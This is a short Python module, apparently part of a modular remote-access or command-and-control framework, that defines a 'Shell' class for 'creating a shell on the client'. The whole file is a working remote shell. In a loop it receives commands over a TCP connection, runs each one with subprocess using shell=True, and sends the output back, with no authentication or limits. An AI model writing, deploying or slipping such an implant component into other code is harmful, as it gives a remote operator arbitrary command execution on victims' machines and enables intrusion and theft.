# Import libraries
import subprocess
from Modules import module


class Shell(module.Module):
    """A module for creating a shell on the client"""

    def __init__(self) -> None:
        super().__init__()
        self.client = None
        self.log = None

        # Set the startup and requirements
        self.startup = module.STARTUP_MANUAL
        self.require = [module.REQUIRE_TCP_CLIENT, module.REQUIRE_LOGGER]

    def start(self):
        while 1:
            # Wait for a command
            command = self.client.receive().decode()
            self.log.info('Received command: %s', command)

            # Check if the agent wants to exit
            if command == 'exit':
                break

            # Execute the command
            try:
                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT).stdout.decode().strip()

            except Exception as error:
                result = f'Command failed: {error}'

            self.log.info('Command result: %s', result)

            # Send the result
            self.client.send(result.encode())
